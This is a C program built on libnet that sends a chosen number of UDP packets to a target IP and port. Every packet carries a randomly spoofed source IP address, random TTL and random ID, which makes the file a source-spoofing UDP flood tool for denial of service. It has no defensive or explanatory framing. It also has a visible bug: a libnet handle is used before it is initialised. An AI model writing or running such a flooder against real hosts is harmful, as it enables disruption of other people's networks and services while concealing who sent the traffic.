#include <libnet.h>

#define DEBUG
#define SLEEP

#ifdef SLEEP
#define SLEEP_TIME 250
#endif


int main(int argc, char** argv) {
    
    u_long dest_ip; //Destination IP address
    u_short dest_udp_port; //Destination Port
    char errbuf[LIBNET_ERRBUF_SIZE]; //Buffer for Libnet Errors

    libnet_t *lib_handle; //Libnet Handle 
    libnet_ptag_t ip_h,udp_h; //Libnet ptags of headers

    int packet_size = LIBNET_IPV4_H + LIBNET_UDP_H; //Packet size of UDP packet

    if(argc < 4) {
        printf("%s","Usage: <Destination IP> <Destination Port> <Number of Packets>");
        exit(EXIT_FAILURE);
    }

    int num_of_packets = atoi(argv[3]);
    
    if(!(dest_ip = libnet_name2addr4(lib_handle, argv[1],LIBNET_RESOLVE))) {
        fprintf(stderr,"Bad Destination IP: %s", libnet_geterror(lib_handle));
        exit(EXIT_FAILURE);
    } //Get destination IP and check validity
    
    dest_udp_port = (u_short) atoi(argv[2]); //Change port string to unsighed short integer
    

    if(!(lib_handle = libnet_init(LIBNET_RAW4,NULL,errbuf))) { //Open a Raw Socket
        fprintf(stderr,"Could not open Raw Socket. Did you run as root?\n");
        exit(EXIT_FAILURE);
    }

    libnet_seed_prand(lib_handle);
    u_int16_t src_udp_port = libnet_get_prand(LIBNET_PRu16); //Random source port number

    int packet_count; //Count of packets created
    u_int32_t spoofed_src_ip; //spoofed 32 bit IP address

    ip_h = LIBNET_PTAG_INITIALIZER; //Initialize new headers 
    udp_h = LIBNET_PTAG_INITIALIZER;

    for(packet_count = 0; packet_count < num_of_packets; packet_count++) { 

      udp_h = libnet_build_udp(src_udp_port, //Source port
                       dest_udp_port, //Destination port
                       LIBNET_UDP_H, //Length of UDP packet (just the header for now)
                       0, //Checksum not computed
                       NULL, // payload
                       0, // payload length
                       lib_handle, //handle
                       udp_h); // modify existing headers
	      
	if(udp_h == -1) {
	    fprintf(stderr, "UDP packet could not be created: %s", libnet_geterror(lib_handle));
	    exit(EXIT_FAILURE);
	}
                 
        ip_h = libnet_build_ipv4(packet_size, 
                        IPTOS_LOWDELAY, //Low delay Type of Service
                        libnet_get_prand(LIBNET_PRu16), //Random 16 bit Identification
                        0, //Fragmentation bits and offset
                        libnet_get_prand(LIBNET_PR8), //Random TTL 
                        IPPROTO_UDP, //Upper transport protocol
                        0, //Checksum
                        spoofed_src_ip = libnet_get_prand(LIBNET_PRu32), //Spoof Source IP
                        dest_ip, //Destination IP
                        NULL, //No payload (for now)
                        0,//Payload length (for now)
                        lib_handle, //Handle
                        ip_h); //modify existing headers
       
       if(ip_h == -1) {
           fprintf(stderr, "IP header could not be created: %s",libnet_geterror(lib_handle));
           exit(EXIT_FAILURE);
       }

       if(libnet_write(lib_handle) == -1) {
	   fprintf(stderr, "libnet_write failed: %s on Packet number:%i \n", libnet_geterror(lib_handle),packet_count);
	   exit(EXIT_FAILURE);
       }

       #ifdef DEBUG 
	printf("UDP PACKET:%i from %s\n",packet_count, libnet_addr2name4(spoofed_src_ip,LIBNET_DONT_RESOLVE));
	fflush(stdout); 
       #endif 
	 
       
      #ifdef SLEEP //For debugging purposes
        usleep(SLEEP_TIME);
      #endif 
   }
   
   libnet_destroy(lib_handle);
   return EXIT_SUCCESS;
}
